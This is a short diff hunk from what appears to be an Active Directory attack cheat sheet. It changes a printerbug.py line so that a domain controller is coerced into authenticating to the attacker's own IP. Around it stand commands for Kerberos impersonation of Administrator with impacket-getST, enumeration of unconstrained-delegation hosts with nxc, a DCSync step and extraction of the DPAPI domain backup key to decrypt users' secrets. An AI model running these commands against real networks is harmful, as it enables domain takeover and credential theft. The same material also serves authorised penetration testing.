@@ -315,7 +315,7 @@ impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address>
 # Unconstrained delegation — coerce a DC to you (TGT monitor on the unconstrained host) -> DCSync:
 # companion:gen unconstrained-deleg-tgt
 nxc ldap <ip_address> -u <user> -p <password> --trusted-for-delegation
-printerbug.py <domain>/<user>:<password>@<dc> <unconstrained-host>
+printerbug.py <domain>/<user>:<password>@<ip_address> <your-ip>
 # companion:end unconstrained-deleg-tgt
 
 # DPAPI domain backup key — pull once w/ DA, then decrypt any user's secrets offline:
